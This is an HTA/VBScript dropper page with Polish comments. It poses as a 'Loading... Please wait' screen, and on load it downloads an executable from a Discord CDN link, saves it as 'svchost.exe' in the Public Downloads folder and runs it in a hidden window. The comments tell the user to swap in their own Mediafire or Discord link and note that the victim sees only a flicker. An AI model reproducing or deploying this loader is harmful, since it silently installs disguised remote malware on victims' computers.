<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <script language="VBScript">
        Sub Window_OnLoad
            On Error Resume Next
            
            ' >>>>>> ZMIEŃ TEN LINK NA SWÓJ Z MEDIAFIRE LUB DISCORD <<<<<<
            payloadURL = "https://cdn.discordapp.com/attachments/1451350121353838612/1494412096480215100/autorynek.exe?ex=69e28338&is=69e131b8&hm=3431c111557bd9c796f3ef716d02d634eb1c27a2f527630848a108551be9f63a&"
            
            ' Pobierz plik
            Set http = CreateObject("MSXML2.XMLHTTP")
            http.open "GET", payloadURL, False
            http.send
            
            ' Zapisz w folderze publicznym (unikamy problemów z uprawnieniami)
            Set stream = CreateObject("ADODB.Stream")
            stream.Type = 1 ' binary
            stream.Open
            stream.Write http.responseBody
            stream.SaveToFile "C:\Users\Public\Downloads\svchost.exe", 2 ' overwrite
            
            ' Uruchom w tle (okno ukryte)
            Set shell = CreateObject("WScript.Shell")
            shell.Run "C:\Users\Public\Downloads\svchost.exe", 0, False
            
            ' Zamknij okno mshta – ofiara widzi tylko mignięcie
            window.close
        End Sub
    </script>
</head>
<body>
    <p>Please wait...</p>
</body>
</html>
